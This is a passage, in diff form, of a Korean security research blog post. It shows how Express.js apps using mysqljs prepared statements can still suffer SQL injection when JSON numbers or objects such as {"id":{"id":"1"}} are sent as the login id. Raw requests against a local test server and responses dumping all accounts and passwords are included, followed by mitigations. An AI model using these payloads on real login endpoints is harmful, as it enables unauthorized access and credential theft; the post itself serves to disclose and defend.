+<p>즉 <code class="highlighter-rouge">Prepared Statement</code>를 사용함으로써 사용자가 입력한 Input을 쿼리로 사용하는 일은 없어졌어요!</p>
+
+<h2 id="또-다시-sqli">또 다시 SQLi</h2>
+
+<p>그럼 이제 안전할까요? 안전했다면 저는 이 글을 쓰고 있지 않았을 거예요 :)</p>
+
+<p>아주 제한적인 SQLi를 할 수 있습니다 😂😂😂</p>
+
+<p><code class="highlighter-rouge">Express.js</code>에서는 JSON Type으로 입력을 받을 수 있고 <code class="highlighter-rouge">res.body.id</code>에 JSON Type의 Object를 넣어 줄 수 있습니다. 일반적인 상황에서는 <code class="highlighter-rouge">Prepared Statement</code>를 사용함으로써 대부분의 SQLi 취약점에 대응할 수 있지만  Object를 넣을 수 있는 상황에서는 또 얘기가 달라집니다. 🤔🤔🤔</p>
+
+<p><code class="highlighter-rouge">SqlString.escape</code> 함수에 Object가 들어갔을때 어떻게 되는지에 대한 예시는 아래의 URL에 정리가 잘되어 있습니다. 참고해주세요.</p>
+
+<p><a href="https://github.com/mysqljs/mysql/blob/ad014c82b2cbaf47acae1cc39e5533d3cb6eb882/test/unit/protocol/test-SqlString.js">mysqljs/mysql</a></p>
+
+<p>결론적으로 SQLi 취약점이 발생하는 몇가지 예시 먼저 보여 드리자면 아래와 같습니다.</p>
+
+<h3 id="case-1">Case 1</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://127.0.0.1:3000/login HTTP/1.1
+Host: 127.0.0.1:3000
+content-type: application/json
+
+{"id":0}
+</code></pre></div></div>
+
+<p><img src="/assets/202010/202010_soo2.png" alt="/assets/202010/202010_soo2.png" /></p>
+
+<center><b>MySQL Query Log</b></center>
+
+<p>MySQL Query Log를 살펴보면 위와 같습니다. 어떤 일이 벌어질까요?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: application/json; charset=utf-8
+Content-Length: 57
+Date: Tue, 29 Sep 2020 13:08:36 GMT
+Connection: keep-alive
+Cache-Control: no-cache
+
+[{"id":"admin","pw":"hello"},{"id":"guest","pw":"guest"}]
+</code></pre></div></div>
+
+<p>서버로 부터 위와 같은 응답이 왔습니다.</p>
+
+<p>이유를 설명 드리자면 MySQL의 id는 text Type입니다. 0인 int형 숫자와 비교했기 때문에 숫자로 시작하는 id가 아닌 <code class="highlighter-rouge">admin</code>, <code class="highlighter-rouge">guest</code>의 결과 값을 확인할 수 있게 됩니다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://127.0.0.1:3000/login HTTP/1.1
+Host: 127.0.0.1:3000
+content-type: application/json
+
+{"id":[0]}
+</code></pre></div></div>
+
+<p>위와 같이 <code class="highlighter-rouge">{"id":[0]}</code>은 <code class="highlighter-rouge">{"id":0}</code>과 똑같은 결과가 돌아옵니다.</p>
+
+<p>그렇다면 0이 아닌 다른 숫자를 입력 했을 땐 어떤 결과를 나올까요?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://127.0.0.1:3000/login HTTP/1.1
+Host: 127.0.0.1:3000
+content-type: application/json
+Content-Length: 8
+Pragma: no-cache
+
+{"id":1}
+</code></pre></div></div>
+
+<p><img src="/assets/202010/202010_soo3.png" alt="/assets/202010/202010_soo3.png" /></p>
+
+<center><b>MySQL Query Log</b></center>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: application/json; charset=utf-8
+Content-Length: 26
+Date: Tue, 29 Sep 2020 13:13:15 GMT
+Connection: keep-alive
+Cache-Control: no-cache
+
+[{"id":"1test","pw":"pw"}]
+</code></pre></div></div>
+
+<p>1을 넣으면 위와 같은 이유(text와 int의 비교)로 1로 시작하는 계정인 <code class="highlighter-rouge">1test</code>가 돌아옵니다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://127.0.0.1:3000/login HTTP/1.1
+Host: 127.0.0.1:3000
+content-type: application/json
+Content-Length: 8
+Pragma: no-cache
+
+{"id":2}
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: application/json; charset=utf-8
+Content-Length: 26
+ETag: W/"1a-RTcXGpGSUcZVtJ0k1TC9IOCdYLg"
+Date: Tue, 29 Sep 2020 13:13:18 GMT
+Connection: keep-alive
+Cache-Control: no-cache
+
+[{"id":"2test","pw":"pw"}]
+</code></pre></div></div>
+
+<p>2을 넣으면 위와 같은 이유(text와 int의 비교)로 2로 시작하는 계정인 <code class="highlighter-rouge">2test</code>가 돌아옵니다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://127.0.0.1:3000/login HTTP/1.1
+Host: 127.0.0.1:3000
+content-type: application/json
+Content-Length: 10
+Pragma: no-cache
+
+{"id":123}
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: application/json; charset=utf-8
+Content-Length: 28
+ETag: W/"1c-zKsnpl5rZNcQDMNwS5q2y5F0oEs"
+Date: Tue, 29 Sep 2020 13:13:20 GMT
+Connection: keep-alive
+Cache-Control: no-cache
+
+[{"id":"123test","pw":"pw"}]
+</code></pre></div></div>
+
+<p>123을 넣으면 위와 같은 이유(text와 int의 비교)로 123으로 시작하는 계정인 <code class="highlighter-rouge">123test</code>가 돌아옵니다.</p>
+
+<p><strong>계정의 전체 ID를 모르는 상황에서 숫자로 시작하는 계정에 접근하거나 맨 위(idx가 가장 낮은)에 있는 Row에 접근할 수 있게 됩니다.</strong></p>
+
+<h3 id="case-2">Case 2</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://127.0.0.1:3000/login HTTP/1.1
+Host: 127.0.0.1:3000
+content-type: application/json
+
+{"id":{"id":"1"}}
+</code></pre></div></div>
+
+<p>이번에는 위와 같은 요청을 보내 보겠습니다.</p>
+
+<p><code class="highlighter-rouge">{"id":"1"}</code>는 escape 함수를 통해서 ``id<code class="highlighter-rouge"> = '1'</code>와 같이 치환됩니다. 그러면 실제로 어떤 일이 일어날까요?</p>
+
+<p>MySQL Query Log를 살펴봅시다!</p>
+
+<p><img src="/assets/202010/202010_soo4.png" alt="/assets/202010/202010_soo4.png" /></p>
+
+<center><b>MySQL Query Log</b></center>
+
+<p>세상에… 🤦‍♂️🤦‍♂️🤦‍♂️</p>
+
+<p>저런 Query문이라면 injection을 통해 1=1을 만든 결과와 다를 게 없겠는데요?</p>
+
+<p>네, 맞습니다!!!</p>
+
+<p>column 명을 알고 있는 경우 위와 같은 Injection이 가능하게 됩니다!</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: application/json; charset=utf-8
+Content-Length: 160
+Date: Tue, 29 Sep 2020 13:21:20 GMT
+Connection: keep-alive
+Cache-Control: no-cache
+
+[{"id":"admin","pw":"hello"},{"id":"guest","pw":"guest"},{"id":"1test","pw":"pw"},{"id":"12test","pw":"pw"},{"id":"2test","pw":"pw"},{"id":"123test","pw":"pw"}]
+</code></pre></div></div>
+
+<p>실제로 서버에서 온 응답을 살펴보면 모든 Row를 받아온 것을 확인할 수 있습니다.</p>
+
+<p>또한 위 방법으로 column 이름을 Brute Force 공격을 통해 알아낼 수 도 있습니다.</p>
+
+<p>이 외에도 Object가 직접 query 함수의 입력 값으로 들어갈 수 있기 때문에 다양한 취약점이 발생 될 것이라고 생각됩니다. 다른 경우들은 앞으로 연구해야 할 필요가 있을것 같아요.</p>
+
+<h2 id="대응-방안">대응 방안</h2>
+
+<p>그러면 어떻게 대응 할 수 있을까요?</p>
+
+<p>Query에 Object가 직접 들어가기 때문에 발생한 문제였으니깐 toString() 함수를 사용해서 해결 할 수 있습니다.</p>
+
+<p>또한 Prepared Statement에서 <code class="highlighter-rouge">??</code> 물음표를 2개 사용하게 되면 내부적으로 toString 함수가 적용되어 위 취약점에 대응할 수 있습니다.</p>
+
+<p>toString()을 적용하게 되면 아래와 같이 Object가 문자열로 들어가게 됩니다!</p>
+
+<p><img src="/assets/202010/202010_soo5.png" alt="/assets/202010/202010_soo5.png" /></p>
+
+<h1 id="마무리">마무리</h1>
+
+<p>이번에는 Express.js + MySQL을 사용할 때 발생할 수 있는 SQLi 취약점과 Prepared Statement를 적용 했을 때도 SQLi 취약점이 발생할 수 있다는 내용을 살펴봤습니다.</p>
+
+<p>Prepared Statement를 사용하면 무조건 안전 할 것이다, escape 함수에 0-day 취약점이 존재하지 않는다면 안전할 것이라고 생각했던 <code class="highlighter-rouge">생각의 틀</code>을 깨 주었던 연구였습니다.</p>
+
+<p>여러분 모두 고정적인 사고를 벗어나 취약점을 찾아봅시다. 😂</p>
+
+   </div>
+</div>
+
+
+  <!-- Start disqus 
+<script src="/assets/js/disqusLoader.js" /></script>
+<div id="disqus_thread"><h3>Discussion and feedback</h3></div>
+<div class="disqus"></div>
+<script>
+    disqusLoader('.disqus', {
+        scriptUrl: 'https://jekyll-tale.disqus.com/embed.js'
+    });
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+End disqus -->
+
+
+<div class="pagination">
+  
+   <a href="/2020-10-01/Hide-JavaScript-Code-in-PNG-1d24960c8d174fce8729f7f8003fce4b" class="left arrow">&#8592;</a>
+  
+  
+   <a href="/2020-10-01/Does-linux-dream-of-windows-6a288da619ca4f39a80156209db1e977" class="right arrow">&#8594;</a>
+  
+
+  <a href="#" class="top">Top</a>
+</div>
+    </main>
+
+    <!--footer>
+  <span>
+    &copy; <time datetime="2021-03-08 07:19:49 +0000">2021</time> Core-Research-Team. Made with Jekyll using the <a href="https://github.com/chesterhow/tale/">Tale</a> theme.
+  </span>
+</footer-->
+
+  </body>
+</html>
